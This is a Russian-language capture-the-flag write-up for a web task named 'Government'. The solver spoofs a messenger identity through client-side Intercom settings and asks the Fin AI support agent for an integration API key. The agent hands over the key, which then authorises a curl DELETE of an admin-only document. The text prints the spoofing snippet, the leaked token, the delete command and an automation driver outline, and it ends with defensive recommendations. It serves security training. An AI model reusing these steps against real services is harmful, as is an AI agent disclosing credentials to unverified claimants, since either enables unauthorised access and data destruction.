# Government — технический разбор

**Флаг:** `avito{hoN3Y_BAdgERS_allOwEd_1N_beehIVe_N0w}`
**Класс:** web / broken access control / identity spoofing / LLM secret disclosure

## Краткое техническое резюме

Portal принимает два bearer credential types: обычные session tokens `sess_…` и integration tokens
`hof365_…`. Integration token предоставляет доступ к administrative document deletion без проверки
user role.

HoneyOffice token выдаёт Intercom Fin support agent. Messenger Identity Verification отключена,
поэтому client может объявить произвольный email, включая `queen@hive.gov`. AI agent доверяет
неподтверждённой identity и возвращает соответствующий `hof365_` token. Запрос
`DELETE /api/documents/1` с этим token удаляет документ и возвращает флаг.

---

## 1. Контекст и цель

Target portal:

```text
https://government-dtpd4cpr.avitoctf.ru/
```

Целевой объект — document ID 1, указ Королевы Роя. Флаг возвращается только после успешного deletion:

```http
DELETE /api/documents/1

HTTP/1.1 202 Accepted
{"message":"Документ удалён. Ваш флаг avito{...}","status":"deleted"}
```

## 2. Reconnaissance и attack surface

React bundle и `/honeyoffice-openapi.yaml` описывают:

- roles `citizen`, `editor`, `border_service`, `support_agent`, `administrator`;
- session bearer tokens с prefix `sess_`;
- HoneyOffice integration tokens с prefix `hof365_`;
- `GET /api/documents`;
- `DELETE /api/documents/{documentId}`;
- `/api/auth/register`, `/api/auth/login`, `/api/auth/me`, `/api/auth/logout`.

Authorization behavior:

- `citizen` session → `403 Недостаточно прав`;
- invalid `hof365_` token → `401 Войдите в аккаунт`;
- valid `hof365_` token → `202 Accepted` независимо от user role.

Попытки direct role escalation не дают результата: registration игнорирует mass-assignment field
`role`, email domain не влияет на permissions, role headers/query parameters не обрабатываются, login
не уязвим для SQL injection. Реальный privileged path — acquisition integration credential.

Changelog указывает, что support agents выдают API keys specific users через chat. Portal загружает
Intercom messenger с `app_id = r84vggjn`, где Fin работает как AI support agent.

## 3. Анализ и проверка гипотез

Responses Intercom `ping`/`home` содержат:

```json
{
  "messenger_security_enabled": false,
  "identity_verification_ready": false
}
```

При включённой Intercom Identity Verification backend передаёт HMAC для `email` или `user_id`, и
messenger проверяет identity binding. В текущей конфигурации identity полностью контролируется
browser-side settings:

```javascript
window.intercomSettings = {
  app_id: "r84vggjn",
  email: "queen@hive.gov"
};
```

После загрузки messenger Fin получает запрос на выдачу HoneyOffice 365 API key для текущей identity.
Agent возвращает token вида:

```text
hof365_GEj7f0csi1HHZHU8gLMOfoPqDJDFsRrBTcrWyzbx
```

Это не authentication bypass внутри основного login endpoint: compromised trust boundary находится
между portal, third-party messenger identity и AI support workflow.

### 3.1. Intercom protocol handling

Попытка отправить message через guessed raw API schema не работает:

- `POST /messenger/web/conversations` возвращает conversation list;
- `POST /messenger/web/messages` с `body` или `text` отвечает
  `400 parameter_invalid "must have body or upload_ids"`.

Actual widget кодирует rich text в поле `blocks`. Чтобы не воспроизводить private protocol вручную,
`drv.py` запускает Chrome, загружает `intercom_boot.html`, взаимодействует с textarea внутри
cross-origin iframe и перехватывает responses через Chrome DevTools Protocol. Child CDP sessions
используются для out-of-process iframes.

## 4. Корневая причина

Exploit требует сочетания трёх control failures:

1. **Excessive integration privileges.** Любой valid `hof365_` token проходит administrative delete
   path без user-role authorization.
2. **Unverified messenger identity.** Intercom принимает email из client-controlled JavaScript без
   server-generated HMAC.
3. **Secret disclosure by support agent.** Fin выдаёт privileged integration credential на основании
   заявленной identity и natural-language request, без independent authentication или approval.

В итоге attacker-controlled identity становится достаточным условием для получения bearer secret,
который предоставляет destructive administrative capability.

## 5. Эксплуатация

### 5.1. Получение integration token

Messenger запускается с identity `queen@hive.gov`. В support chat отправляется запрос на выдачу
HoneyOffice 365 API key текущего пользователя. `drv.py` извлекает первый response pattern
`hof365_[A-Za-z0-9]+`.

### 5.2. Удаление документа

```bash
curl -s -X DELETE \
  https://government-dtpd4cpr.avitoctf.ru/api/documents/1 \
  -H 'Authorization: Bearer hof365_GEj7f0csi1HHZHU8gLMOfoPqDJDFsRrBTcrWyzbx'
```

Response:

```json
{
  "message": "Документ удалён. Ваш флаг avito{hoN3Y_BAdgERS_allOwEd_1N_beehIVe_N0w}",
  "status": "deleted"
}
```

Полный browser-assisted flow:

```bash
uv run python task11/drv.py self-test
uv run python task11/drv.py solve
```

`self-test` проверяет token extraction без network access. `solve` запускает local HTTP server
и isolated Chrome, инициализирует messenger, отправляет request через реальный widget,
извлекает token и выполняет final DELETE.

## 6. Флаг

```text
avito{hoN3Y_BAdgERS_allOwEd_1N_beehIVe_N0w}
```

## 7. Выводы и рекомендации

- Third-party messenger identity необходимо связывать с server-authenticated account через HMAC
  Identity Verification; client-supplied email не является authentication evidence.
- AI support agents не должны возвращать bearer secrets. Credential issuance требует
  deterministic policy, step-up authentication, scoped approval и audit trail.
- Integration tokens должны иметь explicit scopes и least privilege. Document deletion требует
  отдельного capability и resource-level authorization.
- Основной backend обязан выполнять authorization независимо от upstream issuer или token type.
- Для dynamic SaaS integrations browser instrumentation через CDP позволяет получить фактический
  request schema и OOPIF behavior без предположений о private API.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task11/drv.py` — end-to-end Chrome driver, Intercom interaction, token extraction и document
  deletion.
- `task11/cdp.py` — Chrome DevTools Protocol transport и session handling.
- `task11/intercom_boot.html` — минимальная bootstrap page для messenger.

OpenAPI capture и response fixtures генерируются при reconnaissance и не входят в
version-controlled набор; driver получает актуальное state из target instance.
